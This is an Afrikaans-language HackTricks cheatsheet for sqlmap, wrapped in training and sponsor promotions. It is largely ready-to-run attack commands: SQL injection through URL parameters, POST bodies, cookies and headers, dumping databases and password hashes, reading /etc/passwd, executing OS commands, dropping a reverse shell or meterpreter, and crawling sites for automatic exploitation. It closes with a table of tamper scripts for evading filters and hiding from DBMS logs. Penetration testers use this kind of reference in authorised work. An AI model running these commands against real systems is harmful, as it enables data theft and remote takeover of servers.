# SQLMap - Cheatsheet

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Onmiddellik beskikbare opstelling vir kwesbaarheidsevaluering & penetrasietoetsing**. Voer 'n volledige pentest vanaf enige plek uit met 20+ gereedskap & funksies wat van rekognisie tot verslagdoening gaan. Ons vervang nie pentesters nie - ons ontwikkel pasgemaakte gereedskap, opsporing & eksploitasiemodules om hulle weer 'n bietjie tyd te gee om dieper te delf, shells te pop en pret te h√™.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Basiese argumente vir SQLmap

### Generies
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### Inligting Herwin

#### Internaal
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### DB data
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Inspuitplek

### Van Burp/ZAP vang

Vang die versoek en skep 'n req.txt l√™er
```bash
sqlmap -r req.txt --current-user
```
### GET Versoek Inspuiting
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST Versoek Inspuiting
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Injekties in Headers en ander HTTP Metodes
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Dui string aan wanneer inspuiting suksesvol is
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap** laat die gebruik van `-e` of `--eval` toe om elke payload te verwerk voordat dit met 'n python oneliner gestuur word. Dit maak dit baie maklik en vinnig om die payload op pasgemaakte maniere te verwerk voordat dit gestuur word. In die volgende voorbeeld is die **flask cookie sessie** **onderteken deur flask met die bekende geheim voordat dit gestuur word**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Lees L√™er
```bash
--file-read=/etc/passwd
```
### Krap 'n webwerf met SQLmap en outomatiese eksploitasie
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Tweede Orde Inspuiting
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Lees hierdie pos** ](second-order-injection-sqlmap.md)**oor hoe om eenvoudige en komplekse tweede orde inspuitings met sqlmap uit te voer.**

## Pas Inspuiting aan

### Stel 'n agtervoegsel in
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Voorvoegsel
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Help om booleaanse inspuiting te vind
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper

Onthou dat **jy jou eie tamper in python kan skep** en dit is baie eenvoudig. Jy kan 'n tamper voorbeeld op die [Tweede Orde Injekie bladsy hier](second-order-injection-sqlmap.md) vind.
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Description                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Vervang apostrof karakter met sy UTF-8 volle breedte teenhanger                                                                     |
| apostrophenullencode.py      | Vervang apostrof karakter met sy onwettige dubbele unicode teenhanger                                                              |
| appendnullbyte.py            | Voeg ge√´nkodeerde NULL byte karakter by die einde van die payload aan                                                                |
| base64encode.py              | Base64 al karakters in 'n gegewe payload                                                                                           |
| between.py                   | Vervang groter as operator ('>') met 'NOT BETWEEN 0 AND #'                                                                         |
| bluecoat.py                  | Vervang spasie karakter na SQL verklaring met 'n geldige random le√´ karakter. Vervang daarna karakter = met LIKE operator          |
| chardoubleencode.py          | Dubbel url-encode al karakters in 'n gegewe payload (nie reeds ge√´nkodeerde verwerk)                                              |
| commalesslimit.py            | Vervang voorbeelde soos 'LIMIT M, N' met 'LIMIT N OFFSET M'                                                                       |
| commalessmid.py              | Vervang voorbeelde soos 'MID(A, B, C)' met 'MID(A FROM B FOR C)'                                                                  |
| concat2concatws.py           | Vervang voorbeelde soos 'CONCAT(A, B)' met 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                                 |
| charencode.py                | Url-encode al karakters in 'n gegewe payload (nie reeds ge√´nkodeerde verwerk)                                                     |
| charunicodeencode.py         | Unicode-url-encode nie-ge√´nkodeerde karakters in 'n gegewe payload (nie reeds ge√´nkodeerde verwerk). "%u0022"                     |
| charunicodeescape.py         | Unicode-url-encode nie-ge√´nkodeerde karakters in 'n gegewe payload (nie reeds ge√´nkodeerde verwerk). "\u0022"                     |
| equaltolike.py               | Vervang al voorkomste van operator gelyk ('=') met operator 'LIKE'                                                                 |
| escapequotes.py              | Slas escape aanhalings (' en ")                                                                                                     |
| greatest.py                  | Vervang groter as operator ('>') met 'GREATEST' teenhanger                                                                         |
| halfversionedmorekeywords.py | Voeg 'n geversioneerde MySQL kommentaar voor elke sleutelwoord by                                                                    |
| ifnull2ifisnull.py           | Vervang voorbeelde soos 'IFNULL(A, B)' met 'IF(ISNULL(A), B, A)'                                                                  |
| modsecurityversioned.py      | Omhels volledige navraag met geversioneerde kommentaar                                                                               |
| modsecurityzeroversioned.py  | Omhels volledige navraag met nul-geversioneerde kommentaar                                                                          |
| multiplespaces.py            | Voeg meerdere spasies rondom SQL sleutelwoorde by                                                                                   |
| nonrecursivereplacement.py   | Vervang vooraf gedefinieerde SQL sleutelwoorde met verteenwoordigings geskik vir vervanging (bv. .replace("SELECT", "")) filters   |
| percentage.py                | Voeg 'n persentasieteken ('%') voor elke karakter by                                                                                |
| overlongutf8.py              | Converteer al karakters in 'n gegewe payload (nie reeds ge√´nkodeerde verwerk)                                                    |
| randomcase.py                | Vervang elke sleutelwoord karakter met random kaswaarde                                                                              |
| randomcomments.py            | Voeg random kommentaar by SQL sleutelwoorde                                                                                         |
| securesphere.py              | Voeg spesiaal saamgestelde string by                                                                                                 |
| sp\_password.py              | Voeg 'sp\_password' by die einde van die payload vir outomatiese obfuskaasie van DBMS logs                                         |
| space2comment.py             | Vervang spasie karakter (' ') met kommentaar                                                                                       |
| space2dash.py                | Vervang spasie karakter (' ') met 'n streep kommentaar ('--') gevolg deur 'n random string en 'n nuwe lyn ('\n')                  |
| space2hash.py                | Vervang spasie karakter (' ') met 'n pond karakter ('#') gevolg deur 'n random string en 'n nuwe lyn ('\n')                      |
| space2morehash.py            | Vervang spasie karakter (' ') met 'n pond karakter ('#') gevolg deur 'n random string en 'n nuwe lyn ('\n')                      |
| space2mssqlblank.py          | Vervang spasie karakter (' ') met 'n random le√´ karakter uit 'n geldige stel alternatiewe karakters                                |
| space2mssqlhash.py           | Vervang spasie karakter (' ') met 'n pond karakter ('#') gevolg deur 'n nuwe lyn ('\n')                                          |
| space2mysqlblank.py          | Vervang spasie karakter (' ') met 'n random le√´ karakter uit 'n geldige stel alternatiewe karakters                                |
| space2mysqldash.py           | Vervang spasie karakter (' ') met 'n streep kommentaar ('--') gevolg deur 'n nuwe lyn ('\n')                                        |
| space2plus.py                | Vervang spasie karakter (' ') met plus ('+')                                                                                       |
| space2randomblank.py         | Vervang spasie karakter (' ') met 'n random le√´ karakter uit 'n geldige stel alternatiewe karakters                                |
| symboliclogical.py           | Vervang AND en OR logiese operators met hul simboliese teenhangers (&& en                                                          |
| unionalltounion.py           | Vervang UNION ALL SELECT met UNION SELECT                                                                                          |
| unmagicquotes.py             | Vervang aanhaling karakter (') met 'n multi-byte kombinasie %bf%27 saam met generiese kommentaar aan die einde (om dit te laat werk) |
| uppercase.py                 | Vervang elke sleutelwoord karakter met hoofletters waarde 'INSERT'                                                                   |
| varnish.py                   | Voeg 'n HTTP kop 'X-originating-IP' by                                                                                              |
| versionedkeywords.py         | Omhels elke nie-funksie sleutelwoord met geversioneerde MySQL kommentaar                                                            |
| versionedmorekeywords.py     | Omhels elke sleutelwoord met geversioneerde MySQL kommentaar                                                                         |
| xforwardedfor.py             | Voeg 'n vals HTTP kop 'X-Forwarded-For' by                                                                                         |

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Dadelijk beskikbare opstelling vir kwesbaarheid assessering & pentesting**. Voer 'n volledige pentest van enige plek af uit met 20+ gereedskap & funksies wat van rekognisie tot verslagdoening gaan. Ons vervang nie pentesters nie - ons ontwikkel pasgemaakte gereedskap, opsporing & eksploitasiemodules om hulle terug 'n bietjie tyd te gee om dieper te delf, shells te pop, en pret te h√™.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
